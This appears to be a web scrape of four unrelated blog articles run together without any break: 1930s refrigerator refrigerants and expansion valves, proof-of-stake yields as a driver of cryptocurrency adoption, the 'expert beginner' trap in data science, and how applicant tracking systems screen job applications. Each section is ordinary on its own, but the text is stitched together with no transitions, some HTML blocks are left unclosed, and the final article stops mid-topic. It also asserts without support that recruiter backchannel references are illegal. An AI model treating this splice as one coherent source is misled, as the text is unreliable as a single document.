<p>One of the most noticeable differences between refrigerators in the mid 1930s and today was the refrigerants they used and the refrigerants charges required for operation. &nbsp;A very common refrigerant, Sulpher Dioxide had been in use fora number of years and still appeared to dominate the market at this time, not to say that proprietary chemical refrigerants weren’t beginning to take a large part of the market. &nbsp;F-12 was one of these proprietary substances that would later dominate the refrigerator industry. &nbsp;It was stable up to high temperatures, didn’t stink like SO2 when it leaked, was relatively safe if exposure to it was kept to a minimum, and it has a much lower boiling point than several common refrigerants at the time which means that systems operating F-12 remained in a positive pressure state throughout the cycle. &nbsp;Refrigerators with F-114, SO2, Isobutane and Methyl Formate required a vacuum in the low side of a vapor compression system. &nbsp;This was generally viewed as problematic seeing that if a leak formed in the low side of the system, for instance, around the packing seal of an open drive compressor, atmosphere would leak into the system, bringing non-condensable gases and water vapor. &nbsp;This leads to high head pressures, oil contamination, possible acid formation, corrosion and refrigerant control freeze ups. &nbsp;A curious refrigerant used rarely was Carrene, also known as Dichloromethane which has a boiling point of 104 degrees F at atmospheric pressure. &nbsp;This means both the suction and discharge sides of a system would operate in a vacuum state. &nbsp;Very curious. &nbsp;As I said, the refrigerant charges were unusual as well. &nbsp;The compressors of these systems were rated not much &nbsp;larger than modern day compressors from 1/16 HP up to 1/4 HP, but they had typical charges of 1# to perhaps 3.5# &nbsp;and more depending on the manufacturer. &nbsp;Modern refrigerators have charges measured in ounces, perhaps, 4 oz.. Most of these machines had liquid receivers that held excess refrigerant and ensured a pure liquid supply to the refrigerant control. &nbsp;That excess refrigerant would have allowed continued operation with minor leaks in the system. &nbsp;Another reason for the large charges is the construction of the evaporator which was commonly gravity flooded; a vessel and series of tubes holding refrigerant under low pressure, boiling away to vapor as heat is absorbed from the refrigerated cabinet.<span id="more-4087"></span></p>

<p>Above, is one of these low side float assemblies. &nbsp;These seemed to be falling out of favor by the mid 1930s for various reason having to do with expense and reliability. &nbsp;The float valve simply regulated the volume of liquid refrigerant within the evaporator shell which was maintained at suction pressure. &nbsp;As the refrigerant boiled away and was carried to the compressor, the ball would drop, valve open and additional high pressure liquid would be admitted. &nbsp;When implemented properly, the low side float gravity flooded evaporator has many advantages over the high side float or the dry type evaporator. &nbsp;It was very important that these machines were properly leveled when installed. &nbsp;They definitely had a minimum charge volume below which the float valve would continually call for more refrigerant and when it was not available, the valve would remain open, leaving very little pressure drop between the high and low side resulting in little to no refrigerating effect. &nbsp;A large refrigerant charge could simply be handled with a sufficiently sized liquid receiver. &nbsp;(Also read <a href="https://musingsonentropy.wordpress.com/2013/04/18/the-great-gravity-flooded-evaporator/" target="_blank">The Great Gravity Flooded Evaporator</a>)</p>

<p>This Coldspot has some features worth discussing. &nbsp;For one, it is the package type as described before with the compressor and condensing unit mounted atop the insulated cabinet top with the motor and compressor supported my springs to dampen vibration and noise. &nbsp;The evaporator is of the dry type where the refrigerant is fed to a long coil of tube or series of tubes at approximately the rate in which it is vaporized by the heat of the refrigerated cabinet. &nbsp;Some of the more crude early versions of this used a fixed orifice called a “restrictor”, having a fixed, triangle shaped opening to pass high pressure liquid refrigerant to the evaporator. &nbsp;Before the capillary tube came into use (invented in the late 20s) was the Automatic Expansion Valve which is little more than a pressure regulating valve maintaing a constant pressure within the evaporator coil, often with an adjustable spring compression. &nbsp;This knob or screw would often go out of adjustment because of the constant freeze/thaw occurring at these valves. &nbsp;They were often equipped with a rubber cap or boot to keep moisture from interfering with the adjustment. &nbsp;These AXVs work well in constant load conditions, but under high load tend to starve the evaporator of refrigerant and risk slugging liquid back to the compressor under low load. &nbsp;The improvement to these valves came with the addition of a thermostatic element or “sensor bulb” strapped to the suction line, the temperature of which alters the pressure within the the bulb and in turn, operates a diaphragm inside the valve to properly feed the correct amount of refrigerant to the coil given the conditions. &nbsp;This type of valve would be called a Thermostatic Expansion Valve.</p>

<p>A very simple dry type evaporator with and AXV. &nbsp;Notice the Thermostatic Control Switch. &nbsp;This has nothing to do with the refrigerant supply, but simply controls the electrical current to the compressor and allows the operator to adjust the cabinet temperature. &nbsp;These worked with a thermostatic bulb strapped to the evaporator, suction line or somewhere else in the cabinet. &nbsp;The Thermostat was a great improvement over the controls of the 20s which sometimes used a pressure operated switch tied into the suction line. &nbsp;The service or replacement of these complicated switches could involved breaking the sealed refrigerant line.</p>

<p>An AXV on a dry type coil, but rather than direct expansion, this is a brine tank. &nbsp;The refrigerant tube passes through of a low freezing point brine which in turn froze ice cubes and chilled the space. &nbsp;These had the advantage of having a holdover effect to keep the cabinet cold and prevent short cycling of the compressor and also had a more constant loading effect on the AXV which made for more consistent and predictable performance. &nbsp;The down side of a brine system is the possible corrosive effects of the brine, extra cabinet space taken and the lower evaporator temperatures possibly needed to chill the brine to a temperature that it could in turn chill the refrigerator.</p>

<p>In 2017/18 cryptocurrencies went through a speculative bubble that saw its flagship currency Bitcoin reach peaks of $20,089 and a market cap of $320 billion. At the height of euphoria, the total market cap of all cryptocurrencies reached $790 billion. While Bitcoin and other cryptocurrencies (known as altcoins) have been around since 2009, it was the consolidation of mindshare and public interest in 2017 and 2018 that has made it a mainstay for alternative investors. But the fact remains that we are yet to see the adoption event that will make it a mainstay for all investors.</p>



<p>Most recently Cryptocurrencies have once again found a place in the news cycle following two years of dormancy post the bubble. The central trend appears to be around the phenomenon of decentralised finance otherwise known as DeFi. The quantity of activity and community participation in DeFi and related activities have been pointed to as potential indicators of a return to the speculative mania that took place in 2017. By the end of July, the total value locked up in DeFi related projects was $4 billion. A somewhat marginal amount given that Bitcoin is now over $200 billion in valuation and the whole market for cryptocurrencies is approaching $350 billion.</p>



<p>Regardless, DeFi represents a strong use case for cryptocurrencies as a means to provide lending and borrowing capabilities and is also geared to attract significant speculative interest. One of the most basic and pervasively engaged features of DeFi at present is yield farming. Cryptocurrency assets can earn or ‘farm’ yields in three main forms:</p>



<ol><li>Participating in financial products as one would in traditional markets</li><li>Locking up some cryptocurrency liquidity in return for an interest-like reward.</li><li>Staking cryptocurrency (like collateral) to fortify the security of a Proof-of-Stake based blockchain platform, where ‘staking’ some tokens prevents malicious activity similar to how a collateralized loan prevents default risk.</li></ol>



<p>However, the attention decentralised finance (DeFi) is getting right now, looks more like a bubble than a catalyst for adoption, where volatility (price, scams, hacks etc) of the industry hasn’t been solved.</p>



<p>The question then is, what is a catalyst for adoption? Given that financial products (form 1) on any platforms, blockchain or otherwise, can provide yields through participation, let us focus on yield farming native to the nature of blockchain (forms 2 &amp; 3), Proof-of-Stake – where providing security/liquidity returns yields.</p>



<p>Proof-of-Stake is simply the mechanism whereby a decentralised platform is able to provide security against attacks on the immutability of the ledger on the blockchain. The name holds the key to understanding this mechanism where ‘staking’ (locking up) the currency on the platform, is the means by which you are able to validate transactions on the ledger (the state of the blockchain) and add to the ledger. The game theory of securing the chain via staking is tied to rewards for being a good actor and penalties for being a bad actor. These rewards represent the yields earned for securing the chain.</p>



<p>What is particularly interesting as the speculation starts to ramp up once more is that Proof-of-Stake based platforms are gaining more attention because of their ability to provide yields in return for a financial stake in the platform. Yields on a Proof-of-Stake network represents a passive income avenue for a spectrum of individual/retail investors all the way to institutional players. This differs from the Proof-of-Work mechanism, most popularly represented by Bitcoin, which consumes electricity (mining) to secure the ledger. Where mining BTC is more difficult and less accessible to the spectrum of investors (currently there are a few large mining farms that make this their primary occupation) most BTC investors will make capital gain returns based on price appreciation through adoption. In the absence of BTC becoming a true global currency it will depend on a series of consolidating speculative bubbles to edge toward adoption – a chicken and egg problem perhaps sped along by the more consistent rewards associated with Proof-of-Stake.</p>



<h3>Yields: A Ponzi scheme or a catalyst for cryptocurrency adoption?</h3>



<p>Thus far the speculation on the future potential of blockchain technology, and cryptocurrencies by extension, is what gives the industry the large valuation it holds, even as use cases seem scarce or utilised by few.</p>



<p>In such a case, providing yields for no inherent value due to lack of use case, appears more like a Ponzi scheme than investment in a nascent technology. The idea is that when more people take a financial stake in the platform and lock up those funds for yields, all the prior participants will continue to benefit, not only from the yields but also from the price appreciation of the currency and market capitalisation of the platform. Of course, the integrity of the platform will only be realised when the use cases are actualised at some point in the future. In the interim, the Ponzi characteristics are exacerbated by the lucrative yield returns (often ranging from 5-20% per annum) made available by Proof-of-Stake networks, in comparison to traditionally available yield/interest earning financial products. It’s important to note that platforms vary in risk and reliability, we can liken it to investing in financial products across different tranches – some more junk-like than others.</p>



<p>Bitcoin, on the other hand, provides an entirely different avenue of investment in blockchain but comes with its own set of challenges – namely the chicken and egg problem we discussed above. Bitcoin requires the expense of electricity through mining activities to secure the network and ‘earn’ Bitcoin. While the rewards for mining on a Proof-of-Work network can be equated to the yields earned for staking on a Proof-of-Stake network, the ‘work’ performed for Proof-of-Work (cost of time and initial investment) makes it impossible for it to operate like a Ponzi scheme. Essentially, this means that Bitcoin can’t propagate its adoption through the mechanism of mining, where mining does not lend itself to the low-effort traits of Proof-of-Stake currently attracting attention to the DeFi bubble.</p>



<p>The lower effort in work required to secure the Proof-of-Stake network allows more users to participate meaningfully and earn yields. This is the beginning of a solution to the chicken and egg problem, where increased participation can bolster the market capitalisation required for widespread traction. In summary, easier participation increases the likelihood of network effect for a platform, where earning yields becomes the initial use case for the platform – as risky or unreliable as it may seem. Increased traction over time is very capable of evolving the volatile and Ponzi-like DeFi space into a mature financial structure supporting the blockchain ecosystem.</p>



<p>During 2017/18 the prevailing narrative of Proof-of-Work and crypto’s use case as a currency was not substantiated and resulted in a bubble rather than an adoption event. While it gained attention on the global stage, the widely held perception was that there was no immediately apparent use case that could sustain and grow its valuation beyond pure speculation. In the last couple of years following the bust of the speculative bubble, Proof-of-Stake has become a more significant narrative for the industry. The most marked indicator being Ethereum (currently Proof-of-Work), the second largest cryptocurrency, indicating its intent to transition to a Proof-of-Stake network.</p>



<p>The narrative of Proof-of-Stake is ballooning out quite rapidly, popularly considered to be propagated by the perceived benefits for scaling transaction capacity. However, what we have identified is that the use case of earning yields has the potential to catalyse the next boom cycle similar to 2017/ 18, and perhaps even to a greater extent. Even in the absence of yields as a catalyst for the next boom cycle, it represents a solid use case as a financial ecosystem to sustain speculative value and drive cryptocurrencies closer to mainstream use.</p>

            <p>When we learn something new, such as a programming language, we start as beginners. We can learn and follow the rules and apply them in a narrow context. However, we don’t understand the bigger picture and get lost outside of that specific context.</p>

<p>Imagine that I enroll in a <a href="https://en.wikipedia.org/wiki/Massive_open_online_course" target="_blank">MOOC</a> on <code>R</code> and learn about statistical analysis, machine learning, and <a href="https://rstudio.github.io/shinydashboard/" target="_blank"><code>Shiny</code></a> dashboards. As part of machine learning, I learn that I should <a href="https://www.rdocumentation.org/packages/caret/versions/6.0-86/topics/createDataPartition" target="_blank">split the data into train and test</a> sets. I apply this in assignments and Kaggle and everything works fine—this is the <em>narrow</em> context.</p>

<p>Then, perhaps I get the opportunity to apply my new skills in a <em>wider</em> context—I build a model, validate it (via random train-test split), and deploy it. However, the offline and online (i.e., A/B test) metrics don’t match up. Eventually, I figure out that I should use a <a href="https://www.fast.ai/2017/11/13/validation-sets/" target="_blank">time-based split</a> so future data doesn’t <em>leak</em> into the training set.</p>

<p>With the benefit of the wider context, I encountered challenges and failures (read: lessons) that were not part of the MOOC assignments. As a result, I got to see the bigger picture; I know there’s still lots to learn. Thus, I continue to learn and progress through the stages of beginner, intermediate, and so on.</p>

<blockquote>
  <p>The more I learn, the more I realise how much I don’t know. – Albert Einstein</p>
</blockquote>

<h2 id="from-beginner-to--expert-beginner">From beginner to … expert beginner</h2>

<p>But what happens if I <em>don’t</em> see the bigger picture?</p>

<p>Let’s assume I work in the HR department of a widget manufacturer. Everything—from headcount to payroll to vacation balance—is run in Excel. I apply my newfound <code>R</code> skills to automate my work via one-off scripts. This involves calculating statistics on factory sites and displaying it via a <code>Shiny</code> dashboard on the department desktop. In the eyes of my manager and team, I’m an absolute rockstar ninja wizard. I get showered with praise and am promoted to manager of HR data science.</p>

<p>I might not know about proper ML validation, deployment, unit tests, or even version control. I certainly haven’t done any of that. But who cares? We don’t need it. I’m now the manager of HR data science. I’m now… an “expert”.</p>

<p>To those in the know, I’m clearly still a beginner. But my context is narrow and I don’t see the bigger picture. Thus, I don’t know that there’s still lots to learn, lots to do. However, because I’ve achieved a modicum of success (through <em>narrow</em> applications of what I learned) and others call me an expert, I now view myself as an expert. As a result, I stop learning. I’m now stuck at a local optima. <strong>I’ve become an <a href="https://daedtech.com/how-developers-stop-learning-rise-of-the-expert-beginner/" target="_blank">expert beginner</a></strong>.</p>

<p>Suppose I stay in that same role, within HR, for 10 years. At the end of it, do I have 10 years of experience, or one year of experience repeated 10 times?</p>

<details><summary>An army of expert beginners led by an expert beginner</summary>
<div>

<p>As head of HR data science, I hire a team of data scientists. Eventually, some team members will suggest new technology (e.g., Python, Docker) or practices (e.g., version control, unit testing).</p>

<p>However, I’m the most experienced (read: longest tenure) and the expert-est expert. I dismiss ideas and technology that I’m unfamiliar with. “Oh, I see you’re new here. Yes, Python sounds like a good idea but the Chief HR Officer really likes the <code><span>Shiny</span></code> dashboard that I built.” “Haha, we don’t need unit tests! I live and breathe this code every day—there’s no need to test it”.</p>

<p>Team members who can see the bigger picture are disappointed by the outdated technology and incorrect practices. They see no room for learning and growth. As a result, <strong>the most talented and ambitious leave</strong> (if they know what’s best for them). For those who stay—hurray! There’s less competition. They’ll toe the line and one day, they’ll be a <em>senior</em> expert beginner and teach new joiners their “expert” ways.</p>

<p>This leads to the <a href="http://brucefwebster.com/2008/04/11/the-wetware-crisis-the-dead-sea-effect/" target="_blank">Dead Sea effect</a> where you’re <strong>left with your least talented and effective</strong> people. They’re grateful to have a job and settle in for a couple of years (or decades). Now, the team has (d)evolved into an army of expert beginners who follow the directions of the top expert beginner.</p>

<p><img src="https://eugeneyan.com/assets/dead-sea.jpg" title="The expert beginners are entrenched and can’t be replace" alt="The expert beginners are entrenched and can’t be replace"></p>

<p>Because expert beginners have learned “everything” there is to learn, tried “everything” there is to try, and done “everything” there is to do, there’s nothing new to learn, try, and do. The team stops trying new ideas—“Oh we don’t use Docker here. We have VMs!”—and the organization stops innovating.</p>

<p>This partly explains some industries getting disrupted. The iPhone disrupting Nokias and Blackberrys, AWS disrupting on-premise hardware, Stripe disrupting payment processing, Tesla disrupting… you get the idea.</p>

<p>The expert beginner doesn't see the bigger picture; thus, he is stuck.</p>

<h2 id="the-beginners-mind-is-always-a-student">The beginner’s mind is always a student</h2>

<p>How do we prevent stagnation (and possibly becoming an expert beginner)? How do we stay open-minded and constantly learning and experimenting?</p>

<p><strong>One way is <a href="https://en.wikipedia.org/wiki/Shoshin" target="_blank">Shoshin</a> (beginner’s mind)</strong>. It’s a concept from Zen Buddhism on having an attitude of openness, eagerness, and no preconceptions, even when our knowledge of the subject is advanced. In other words, to think <em>just</em> like a beginner.</p>

<blockquote>
  <p>In the beginner’s mind there are many possibilities, but in the expert’s there are few. – Shunryu Suzuki</p>
</blockquote>

<p>With beginner’s mind, regardless of your experience and expertise, you <strong>stay curious and approach new ideas and experiences as a student</strong>. Even when new technology or methods don’t fit your paradigm, you’re open to learning and trying it. Students don’t say “That’s not how we do things here”.</p>

<p>Sometimes, when others view us as experts, we let it get to us. We stay within our narrow subject matter expertise and stop exploring new ideas and possibilities. We avoid newer, bigger challenges so we don’t make mistakes; we stick to what has worked in the past. This helps preserve our expert identity.</p>

<blockquote>
  <p>The most dangerous phrase in the language is, “We’ve always done it this way.” – Grace Hopper</p>
</blockquote>

<p>But this doesn’t make sense. In my field of data science, new tools (e.g., Spark, Docker, Airflow) and methods (e.g., embeddings, attention, pre-training) constantly improve on the state of the art (SOTA)—it’s useful, if not essential, to keep up to date. (That said, fundamental techniques like regression and decision trees are often a solid baseline.)</p>

<h2 id="the-beginners-mind-keeps-on-pedalling">The beginner’s mind keeps on pedalling</h2>

<p>Learning is like cycling. When we start pedalling (from a standstill), it takes effort and time to gain momentum. Nonetheless, we’ll pick up speed and begin gaining distance.</p>

<p>We might look back at where we started and think “Wow, I’ve come a long way. Perhaps I don’t have to pedal as hard; perhaps I don’t have to pedal at all.” If we stop pedalling, the initial momentum might carry us slightly further, but eventually, we’ll come to a standstill. While we don’t lose the distance covered, we’re not gaining distance either. (Though in fast-paced fields like tech, if you don’t move forward, <em>you begin to move backward</em>.)</p>

<p>Here, distance is knowledge (and achievements); momentum is learning. While distance is correlated with expertise, the relationship is not as strong as we think (e.g., one year of experience repeated 10 times). I think momentum (the ability to learn and adapt quickly) is part of expertise as well. The experts I know are often reading or hacking. At work, they can synthesize their mental prototypes and tailor solutions based on context.</p>

<p>To maintain momentum, <strong>the beginner’s mind continues to pedal regardless of the distance they’ve covered</strong>. It’s not surprising that many successful people are—and continue to be—voracious readers and learners. Warren Buffet, Bill Gates, Elon Musk, just to name a few. Do you know any successful person that doesn’t read or learn?</p>

<blockquote>
  <p>The illiterate of the 21st century will not be those who cannot read and write, but those who cannot learn, unlearn, and relearn. – Alvin Toffler</p>
</blockquote>

<details><summary>Note: Not all knowledge is the same</summary>
<div>

<p>There’s knowledge that we gain from books and courses—we’re tested on this in exams. Then, there’s <a href="https://commoncog.com/blog/the-tacit-knowledge-series/" target="_blank">(tacit) knowledge</a> that we gain from practice—we’re tested on this in life.</p>

<div>

<blockquote><div lang="en" dir="ltr"><p>You cannot get educated by this self-propagating system in which people study to pass exams, and teach others to pass exams, but nobody knows anything.</p><p>You learn something by doing it yourself, by asking questions, by thinking, and by experimenting. 🧠</p></div>— Richard Feynman (@ProfFeynman) <a href="https://twitter.com/ProfFeynman/status/1295411496407556096?ref_src=twsrc%5Etfw">August 17, 2020</a></blockquote>

</div>

<p>For example, learning to ride a bicycle. We can’t learn to ride a bike by reading a textbook. The <strong>only way to learn is by actually doing it</strong>. We’re going to lose balance and fall, but eventually, we’ll figure it out. Also, our ability to ride a bike is <strong>transferable</strong> to other two-wheeled transport. Once we learn how to ride a regular bike, we’ll have a gentler learning curve on mountains bikes, tandem bikes, and even e-scooters.</p>

<p>Similarly, some skills and knowledge <strong>can only be gained through practice</strong>. They’re usually <strong>transferable</strong> across multiple domains too. For example, what’s the most suitable way to <a href="https://bugra.github.io/posts/2020/5/25/how-to-serve-model/" target="_blank">serve models in production</a>? There are some common patterns: compute offline and cache, serve via microservice, embed in the main app. Do these patterns differ across domains? Not much. Which is the best approach for our use case? Well, it depends—knowing the answer is tacit knowledge.</p>



<p>Often, such skills and knowledge are <strong>fundamental</strong> and can be thought of as building blocks (or <a href="https://jamesclear.com/first-principles" target="_blank">first principles</a>). For example, in programming, we learn about conditionals, iteration, and data structures. In distributed data processing, we learn about map, reduce, and shuffle. Once we understand these fundamentals, it’s easier to pick up another programming language or distributed processing framework. It also helps us write more effective software and <a href="https://en.wikipedia.org/wiki/Extract,_transform,_load" target="_blank">ETL</a> jobs.</p>

<p>Mastering the fundamentals also helps with the <a href="https://commoncog.com/blog/to-get-good-go-after-the-metagame/" target="_blank">metagame</a>. The meta (i.e., higher-order factors) changes constantly. For example, <a href="https://eugeneyan.com/writing/nlp-supervised-learning-survey/" target="_blank">natural language processing</a> has evolved rapidly from recurrent models to embeddings to attention to …</p></div></details></div></div>

<p>Whether you’re lucky enough to be employed or currently out of work, it’s no secret that <strong>landing a job in 2020 is harder than ever before.</strong></p>
<p><span>And while it’s easy to blame coronavirus and wallow in our job-seeker sorrow—and believe me, I’m not ignoring the very real challenges of our current economy—my research suggests there’s more to it than that.</span></p>
<p><span>A friend of mine had been applying to jobs prior to the pandemic, and he hadn’t landed a single interview.&nbsp;</span></p>
<p><span>I thought I’d have the solution to his problem in all of five minutes (I used to be </span>p<span>retty good at applying for jobs online</span><span>), but it turns out he was already doing everything </span><i><span>“right.”</span></i><span>&nbsp;</span></p>
<p><span>His resume listed quantified bullet point after quantified bullet point. The formatting looked good. He tailored his cover letters to the position descriptions. His online presence is superb; he owns the front page of Google results for his name. And LinkedIn rated his profile as an “All-Star.” Oh yeah, he’s also gainfully employed.</span></p>
<p><span>You might be thinking, “Well, if he applied through job boards, that’s his first problem.”&nbsp;</span></p>
<p><span>And I’m thinking, “He used to apply through job boards and land interviews more than 60 percent of the time just a few years ago, so what’s changed?”&nbsp;</span></p>
<p><span>Turns out, A LOT. And I would’ve never known if it wasn’t for my friend stumping me with his seemingly simple quandary. I’m flabbergasted by how out of touch I was with the modern job hunt, which is why I couldn’t </span><b>not</b><span> write this post.&nbsp;</span></p>
<p><strong>With the average job tenure lasting just one year on average, it’s extremely likely you’ll need to understand <i>why</i> in the near future.&nbsp;</strong></p>
<p><span>I wrote this post to demystify the modern recruiting process and help qualified candidates figure out how to apply for jobs online. So if you’re ready to make it past the initial resume screening process and score an interview—and ultimately land the opportunity you deserve—then keep reading.</span></p>

<p><span>TLDR: ATS help recruiters/hiring managers collect, sort, and organize a large number of applications.&nbsp;</span></p>

<h4><span>Most Common ATS Features</span></h4>
<p><span>Rather than manually reviewing each resume, recruiters and hiring managers search for resumes based on keywords, or have the system filter or automatically rank applicants.&nbsp;</span></p>
<p><span>In many cases, recruiters use the technology to do a first pass of resumes, meaning you can be removed from consideration </span><b>by an algorithm without ever being reviewed by a human</b><span>.&nbsp;</span></p>
<p><span><img title="how to apply for jobs online what happens to your resume ats 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02.png" alt="Infographic: What happens to your resume in an applicant tracking system" width="2501" height="10553" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02.png 2501w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-71x300.png 71w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-243x1024.png 243w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-768x3241.png 768w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-364x1536.png 364w" sizes="(max-width: 2501px) 100vw, 2501px">While there </span><a href="https://blog.ongig.com/applicant-tracking-system/top-ats-systems-used-by-the-fortune-500-2019"><span>hundreds of ATS on the market</span></a><span>, most of them list the same features. Understanding them is key to landing an interview. Here are the big ones that will determine whether a human ever sees your resume.</span></p>

<h5><span>Automatic Applicant Ranking/Scoring</span></h5>
<p><span>Many ATS provide an automatic “match rank” or score for each applicant.&nbsp;</span><span><a href="https://www.jobscore.com/features/submit-resume/"><img title="how to apply for jobs online ats ranking scoring" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring.jpg" alt="candidate match score example on Job Score website" width="982" height="400" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring.jpg 982w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-300x122.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-768x313.jpg 768w" sizes="(max-width: 982px) 100vw, 982px"></a>The system will take and parse the information from your resume, and compare it with the job description, looking for specific keywords, then provide a score from 0 to 100, or one to 10, that tells recruiters how qualified a candidate is for said job, based on the criteria set by the hiring manager.&nbsp;</span></p>
<p><span><a href="https://www.jobscore.com/features/submit-resume/"><img title="how to apply for jobs online ats ranking scoring 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02.jpg" alt="ATS extracts contact info, employment and education history from resumes" width="1000" height="420" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02-300x126.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02-768x323.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a>They’ll also score you based on the answers you submit via the online form, aka “knockout questions.”&nbsp;</span></p>
<p><span><a href="https://www.jobscore.com/features/submit-resume/"><img title="how to apply for jobs online ats ranking scoring 03" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03.jpg" alt="Job Score website, qualifying questions" width="1000" height="763" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03-300x229.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03-768x586.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a></span></p>
<p><span>For example, job posts that ask for your location are likely using that information as a filter that will alter your overall qualification score.&nbsp;</span></p>

<h5><span>Comprehensive Candidate Profiles</span></h5>
<p><span>Many ATS will automatically create a comprehensive, wildly detailed profile of you based on your digital footprint and other “public” information. All they need is your email address to populate every piece of available content about you online.&nbsp;</span></p>
<p><span>According to </span><a href="https://resources.workable.com/tutorial/important-applicant-tracking-system-features"><span>Workable</span></a><span>, aggregating candidates’ public information is a way to “humanize” the process, and they list it as a must-have feature for today’s ATS. Here’s how they describe it:</span></p>
<p><i><span>“I want to see faces dammit. And tweets. And maybe other stuff that humanizes this record.”</span></i></p>
<p><span>(In my opinion, that’s just a recipe for complete and total bias, as we know </span><a href="https://www.crowdstaffing.com/blog/hidden-bias-that-affect-the-hiring-process"><span>there’s A LOT of it in recruiting</span></a><span>, even if it’s subconscious.)&nbsp;</span></p>
<p><span>Many <a href="https://www.entelo.com/products/platform/search/">recruitment tools</a> even go so far as to make predictions about candidates based on the information they surface about them online.&nbsp;</span></p>
<p><a href="https://www.entelo.com/products/platform/search/"><span><img title="how to apply for jobs online ats candidate profiles" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles.png" alt="Profile of senior product designer at Acme and predictions about his performance, fit, and longevity." width="1010" height="958" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles.png 1010w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles-300x285.png 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles-768x728.png 768w" sizes="(max-width: 1010px) 100vw, 1010px"></span></a></p>
<p><span>In </span><a href="https://recruitingtools.com/boolean-strings-network/"><span>one of the first posts I read by a recruiter</span></a><span> on this topic, she tells hiring managers to search data enrichment tools/databases, like Pipl, Jigsaw and Zoominfo.&nbsp;</span></p>
<p><span>Pipl’s main use case is for “investigations.”&nbsp;</span></p>
<p><i><span>“</span></i><a href="https://pipl.com/investigation-and-research"><i><span>Pipl’s identity resolution engine</span></i></a><i><span> cross-references global data from the Internet, public records, listings, directories, archives and exclusive sources to show the connections between people and the world.”</span></i></p>
<p><span>ZoomInfo is more for B2B data enrichment. Check out the screenshot below to see how they collect your information.&nbsp;</span></p>
<p><span><a href="https://www.zoominfo.com/business/our-data?utm_campaign=branded"><img title="how to apply for jobs online candidate profiles zoominfo 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02.jpg" alt="ZoomInfo" width="1000" height="899" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02-300x270.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02-768x690.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a>Pretty scary, huh?&nbsp;</span></p>

<h5><span>Resume Parsing</span></h5>
<p><span>This is sort-of a feature of the “Automatic Applicant Ranking/Score” section, but it’s also important to mention on its own.&nbsp;</span></p>
<p><span>Resume parsing refers to how ATS extracts and organizes your resume into “structured data,” so they can do stuff like rank/score you automatically.&nbsp;</span></p>
<p><span>This means that many times submitting a PDF, or using creative typography, will hurt you, because the ATS can’t read the data well, if at all.&nbsp;</span></p>

<h5><span>Resume Storage</span></h5>
<p><span>Even if you’re rejected for a position, the ATS will store your resume in its system, because every time there’s a new role to fill, they’ll start with searching their databases to see who might be a match, which leads me to the next feature.&nbsp;</span></p>

<h5><span>Search and Filters</span></h5>
<p><span>ATS allows hiring managers to search by any keyword, and often with </span><a href="https://recruitingtools.com/boolean-strings-network/"><span>Boolean search</span></a><span>, which connects keywords using AND, OR, NOT and NEAR.</span></p>
<p><span>Some tools will even let you filter by those it labels “not job hoppers,” etc.&nbsp;</span></p>
<p><span>Filters may include the job seeker’s location, application source, age of your profile, and whether or not you’re an employee referral.&nbsp;</span></p>

<h4><span>Recruiters’ dirty little secrets&nbsp;</span></h4>
<h5><span>Backchanneling / Backdoor references</span></h5>
<p><span>If the recruiter actually sees your resume and is interested in interviewing you, she’ll likely visit your LinkedIn profile to make sure everything checks out.&nbsp;</span></p>
<p><span>She may even message any mutual connections you have to see what they’ll say about you. This is illegal but it happens all the time from </span><a href="https://www.glassdoor.com/blog/8-secrets-recruiters-wont-tell-you/"><span>what I read</span></a><span>.</span></p>
